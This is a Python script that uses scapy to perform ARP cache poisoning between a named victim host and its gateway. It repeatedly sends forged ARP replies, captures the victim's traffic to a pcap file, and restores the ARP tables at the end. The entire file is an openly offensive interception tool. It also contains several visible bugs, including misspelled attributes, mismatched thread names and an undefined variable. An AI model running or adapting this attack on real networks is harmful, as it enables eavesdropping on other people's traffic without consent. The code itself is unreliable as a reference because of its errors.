from multiprocessing import Process
from scapy.all import (conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
from scapy.layers.inet import Ether
import os
import sys
import time

from scapy.layers.l2 import ARP


def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who_has", pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None
    pass

class Arper:
    def __init__(self, victim, gateway, interface='en0'):
        self.poison_thread = None
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewatmac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'victim({victim}) is at {self.victimmac}.')
        print('_'*30)

    def run(self):
        self.poision_thread = Process(target=self.posion)
        self.poision_thread.start()
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()
        pass
    def posion(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'ip src:{poison_victim.psrc}')
        print(f'ip dst:{poison_victim.pdst}')
        print(f'mac dst:{poison_victim.hsdst}')
        print(f'mac src:{poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f'ip src:{poison_gateway.psrc}')
        print(f' ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(poison_gateway.summary())
        print(f'Beginning the ARP posion.[CTRL-C to stop]')
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
        pass
    def sniff(self, count=100):
        time.sleep(5)
        print(f'Sniffing {count} packets')
        bdf_filter = "ip host %s" % victim
        packets = sniff(count=count,filter=bdf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('Got the packets')
        self.restore()
        self.poison_thread.terminate()
        print('Finished.')
        pass
    def restore(self):
        print('Restoring ARP tables...')
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:FF'), count=5)
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'), count=5)
        pass
if __name__== '__main__':
        (victim, gatway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
        myarp = Arper(victim, gatway, interface)
        myarp.run()
